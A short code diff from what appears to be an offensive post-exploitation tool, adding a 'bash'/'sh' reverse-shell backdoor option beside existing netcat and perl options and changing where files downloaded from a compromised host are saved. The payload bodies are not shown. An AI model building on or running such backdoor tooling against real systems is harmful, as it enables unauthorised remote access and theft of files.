@@ -82,6 +82,8 @@ class Commander(object):
                                 #    backdoor.msf_php(ip, port)
                                 elif command.split()[1] == "netcat" or command.split()[1] == "nc":
                                     backdoor.netcat(ip, port)
+				elif command.split()[1] == "bash" or command.split()[1] =="sh":
+				    backdoor.bash(ip,port)
                                 elif command.split()[1] == "perl" or command.split()[1] == "pl":
                                     backdoor.perl(ip, port)
                                 #elif command.split()[1] == "php":
@@ -135,7 +137,7 @@ class Commander(object):
                         else:
                             rfile_path = command.split()[1]
                             if len(command.split()) == 2:
-                                lfile_path = '{0}/output/{1}{2}_{3}'.format(getcwd(), info.url.split('/')[-1], rfile_path, info.session)
+                                lfile_path = '{0}/output/{1}{2}_{3}'.format(getcwd(), info.host_ip, rfile_path, info.session)
                                 lfolder = '/'.join(lfile_path.split('/')[:-1])
                                 if not path.exists(lfolder):
                                     makedirs(lfolder)
